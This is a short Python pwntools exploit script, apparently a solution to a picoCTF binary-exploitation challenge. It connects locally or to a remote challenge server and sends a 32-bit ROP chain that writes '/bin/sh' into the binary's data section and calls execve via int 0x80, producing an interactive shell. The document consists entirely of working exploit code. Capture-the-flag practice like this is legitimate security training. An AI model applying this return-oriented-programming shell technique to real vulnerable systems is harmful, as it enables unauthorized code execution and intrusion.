#!/usr/bin/env python3

from pwn import *
from pwnlib.util.net import AddressFamily

exe = ELF("./vuln_patched")

context.binary = exe
gdb_script = '''
b main
b *0x80583b9
continue
'''
context.terminal = ['alacritty', '-e']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("saturn.picoctf.net", 55250)

    return r


def main():
    r = conn()
    offset = 28
    data_addr = exe.symbols.data_start
    bin = u32(b"/bin")
    sh = u32(b"/sh\x00")
    mov_dword_edx_eax = 0x080590f2 # mov dword ptr [edx], eax ; ret
    pop_eax = 0x080b073a # pop eax ; ret
    pop_edx_pop_ebx = 0x080583b9 # pop edx ; pop ebx ; ret
    pop_ecx = 0x08049e29 # pop ecx ; return
    int_80 = 0x0804a3c2
    payload = flat({
        offset: [
            pop_edx_pop_ebx, data_addr, 0,
            pop_eax, bin,
            mov_dword_edx_eax,

            pop_edx_pop_ebx, data_addr + 4, 0,
            pop_eax, sh,
            mov_dword_edx_eax,

            pop_eax, 11,
            pop_ecx, 0 ,
            pop_edx_pop_ebx, 0, data_addr,
            int_80
        ]
    })


    r.sendline(payload);
    r.interactive()


if __name__ == "__main__":
    main()

